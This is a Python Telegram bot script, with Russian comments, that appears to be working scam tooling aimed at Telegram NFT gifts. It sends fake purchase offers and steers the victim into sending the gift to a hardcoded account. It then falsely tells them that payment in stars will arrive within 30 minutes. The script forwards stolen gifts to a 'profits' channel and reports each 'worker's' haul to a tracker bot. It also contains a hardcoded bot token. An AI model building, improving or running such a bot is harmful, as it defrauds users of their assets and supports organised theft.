import asyncio
import logging
import uuid
import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, LinkPreviewOptions,
    InlineKeyboardMarkup, InlineKeyboardButton
)

# --- НАСТРОЙКИ ОФФЕР-БОТА ---
TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
TARGET_USERNAME = "rattiixx"
TARGET_ID = 9158877731  # <--- ОБЯЗАТЕЛЬНО ВСТАВЬ ЦИФРОВОЙ ID АККАУНТА @rattiixx
CURRENCY = {"g": "💎", "s": "⭐"}

# --- НАСТРОЙКИ СВЯЗКИ С ТРЕКЕР-БОТОМ ---
TRACKER_BOT_TOKEN = "8914754146"
TRACKER_ADMIN_ID = 9158877731  # Твой ID (админ из трекера)
PROFIT_CHANNEL_ID = -1003935415154 # ID канала/группы для профитов
PROFIT_TOPIC_ID = 3  # ID ТОПИКА (вкладки) в группе

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
OFFERS: dict[str, dict] = {}

INSTRUCTION_TEXT = "Нажмите на кнопку ниже, чтобы открыть окно отправки подарка."

def offer_kb(oid: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"dec:{oid}"),
        InlineKeyboardButton(text="✅ Принять", callback_data=f"acc:{oid}"),
    ]])

def instruction_kb() -> InlineKeyboardMarkup:
    # Обходной deep link, открывающий нативное окно отправки подарка
    deep_link = f"tg://send_gift?user_id={TARGET_ID}"
    
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Передать подарок", url=deep_link)],
        [InlineKeyboardButton(text="✅ Подарок передан", callback_data="done")],
    ])

# --- КОМАНДА /offer ---
@dp.business_message(Command("offer"))
async def cmd_offer_business(message: Message):
    parts = message.text.split()
    
    if len(parts) < 4:
        return await message.answer(
            "Формат:\n"
            "<code>/offer https://t.me/nft/PlushPepe-2687 20 g</code>\n\n"
            "g — грам 💎, s — звёзды ⭐"
        )

    url, raw_sum, cur_key = parts[1], parts[2], parts[3].lower()
    
    if not url.startswith("https://t.me/nft/"):
        return await message.answer("Ошибка: Ссылка должна быть на NFT-подарок.")
        
    if cur_key not in CURRENCY:
        return await message.answer("Валюта только <b>g</b> или <b>s</b>.")
        
    if not raw_sum.isdigit():
        return await message.answer("Сумма — целое число.")

    oid = uuid.uuid4().hex[:12]
    OFFERS[oid] = {"url": url, "sum": raw_sum, "cur": CURRENCY[cur_key]}
    who = message.from_user.first_name or "Пользователь"
    
    caption = (
        f"Пользователь <b>{who}</b> предлагает Вам {raw_sum} {CURRENCY[cur_key]} за подарок:\n\n"
        f"{url}"
    )

    # Удаляем команду из чата
    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        logging.error(f"Не удалось удалить сообщение: {e}")

    # Отправляем оффер с превью
    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=caption,
            reply_markup=offer_kb(oid),
            business_connection_id=message.business_connection_id,
            link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True)
        )
    except Exception as e:
        logging.error(f"Не удалось отправить оффер: {e}")

# --- ПЕРЕХВАТ NFT-ПОДАРКА ---
@dp.business_message(F.gift)
async def handle_gift(message: Message):
    gift = message.gift
    if not gift:
        return
        
    # Получаем ID воркера
    try:
        conn = await bot.get_business_connection(message.business_connection_id)
        worker_id = conn.user.id
    except Exception as e:
        logging.error(f"Ошибка получения владельца: {e}")
        worker_id = "unknown"
        
    stars = getattr(gift, "star_count", 0) or 0
    base_name = getattr(gift, "base_name", "") or ""
    gift_id = getattr(gift, "id", "")
    
    # 1. Пересылаем сам подарок в канал
    try:
        await bot.forward_message(
            chat_id=PROFIT_CHANNEL_ID,
            message_thread_id=PROFIT_TOPIC_ID,
            from_chat_id=message.chat.id,
            message_id=message.message_id,
            business_connection_id=message.business_connection_id
        )
    except Exception as e:
        logging.error(f"Ошибка пересылки в канал: {e}")

    # 2. Отправляем команду Трекер-боту
    text = f"/add_profit {worker_id} {stars} {base_name} {gift_id}"
    url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TRACKER_ADMIN_ID,
        "text": text
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as resp:
                if resp.status != 200:
                    logging.error(f"Ошибка Трекер-бота: {await resp.text()}")
    except Exception as e:
        logging.error(f"Ошибка HTTP-запроса к Трекер-боту: {e}")

# --- ОБРАБОТКА КНОПОК ---
@dp.callback_query(F.data.startswith("dec:"))
async def on_decline(call: CallbackQuery):
    OFFERS.pop(call.data.split(":")[1], None)
    await call.message.edit_text(text="Вы отклонили предложение.", reply_markup=None)
    await call.answer("Отклонено")

@dp.callback_query(F.data.startswith("acc:"))
async def on_accept(call: CallbackQuery):
    oid = call.data.split(":")[1]
    data = OFFERS.get(oid)
    if not data:
        return await call.answer("Оффер устарел", show_alert=True)

    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(INSTRUCTION_TEXT, reply_markup=instruction_kb())
    await call.answer()

@dp.callback_query(F.data == "done")
async def on_done(call: CallbackQuery):
    await call.message.edit_text(
        "Подарок передан✅\n\n"
        "Проверяем подарок. Звёзды зачислятся в течение 30 минут."
    )
    await call.answer("Проверяем")

async def main():
    logging.basicConfig(level=logging.INFO)
    print("Оффер-бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
